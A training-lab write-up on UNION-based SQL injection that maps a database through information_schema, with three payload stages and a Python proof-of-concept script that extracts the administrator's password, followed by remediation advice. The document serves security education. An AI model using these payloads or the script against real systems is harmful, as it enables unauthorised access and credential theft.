# SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-22

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Accessories'
```

Every previous lab assumed the target table was called `users` with columns named `username` and `password`. In a real attack, those names usually aren't known in advance. Most databases (all except Oracle) expose a built-in schema called `information_schema` that lists every table and column in the database — this lab uses it to discover the credentials table's structure before extracting any data.

## Discovery / Exploitation
The attack happens in three stages, each one feeding the next:

**1. Find the relevant table name:**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
This lists every table in the database. Scanning the results for any name containing "users" identifies the credentials table.

**2. Find the relevant column names:**
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xxx'--
```
This lists every column belonging to that specific table. Scanning for names containing "username" and "password" identifies exactly which columns hold the credentials — since real-world tables sometimes use non-obvious names (e.g. `users_a1b2c3`, `pwd_hash`).

**3. Extract the actual data:**
```sql
' UNION SELECT username_col, password_col FROM users_xxx--
```
With both the table and column names confirmed, this final query pulls the real credential data, exactly like lab 5 — the only difference is the names were discovered dynamically rather than assumed.

## Impact
This demonstrates that not knowing a database's schema in advance is not a meaningful barrier to a UNION-based attack — `information_schema` (or Oracle's equivalent system views) effectively hands an attacker a map of the entire database, table names, column names, and structure included. Once schema-level injection is confirmed, full credential extraction follows the same pattern as lab 5, just preceded by two reconnaissance queries.

## Proof of Concept (Python)
This script automates all three stages: it queries `information_schema.tables` to find the users table, then `information_schema.columns` to find the username/password column names, then performs the final UNION extraction and parses out the administrator's password.

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def perform_request(url, sql_payload):
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text


def sqli_users_table(url):
    sql_payload = "'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False


def sqli_users_columns(url, users_table):
    sql_payload = "'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(string=re.compile('.*username.*'))
    password_column = soup.find(string=re.compile('.*password.*'))
    return username_column, password_column


def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "'+UNION+select+%s,%s+from+%s--" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    match = soup.find(string="administrator")
    if match is None:
        return False
    admin_password = match.parent.find_next('td').text
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Looking for users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("found the users table: %s" % users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("found the username column name: %s" % username_column)
            print("found the password column name: %s" % password_column)
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is %s" % admin_password)
            else:
                print("[-] Did not find the administrator password")
        else:
            print("Did not find the username and password columns")
    else:
        print("Did not find the users table")
```

**How it works:**
1. `sqli_users_table()` — queries `information_schema.tables` and scans the response for any table name containing "users"
2. `sqli_users_columns()` — takes the discovered table name and queries `information_schema.columns` filtered to that table, scanning for column names containing "username" and "password"
3. `sqli_administrator_cred()` — builds a final UNION query using the dynamically discovered table and column names, then locates "administrator" in the response and reads the adjacent password value
4. The `main` block chains all three steps together, printing progress and failing gracefully at whichever stage doesn't find a match

**Example run:**
```bash
python3 exploit_sqli_schema_discovery.py https://your-lab-url.web-security-academy.net
```

**Note:** `information_schema` works on MySQL, PostgreSQL, and SQL Server. Oracle uses different system views (`ALL_TABLES`, `ALL_TAB_COLUMNS`) since it doesn't implement the standard `information_schema`.

## Remediation
- Use **parameterized queries (prepared statements)** — the standard defense, which also blocks schema enumeration through `information_schema` since user input can never alter query structure.
- Apply the **principle of least privilege** to the database account used by the application — restricting access to `information_schema` where the application doesn't legitimately need it limits reconnaissance even if some injection point is missed elsewhere.
- Avoid exposing **raw query results or error feedback** that make automated schema enumeration straightforward.

## Takeaway
This lab shows that "the attacker doesn't know the schema" is not a real defense on its own — `information_schema` turns schema discovery into just another UNION query. It also demonstrates chaining multiple injection queries together, each result feeding the payload of the next, which is exactly how real-world SQL injection exploitation typically unfolds: reconnaissance first, extraction last.
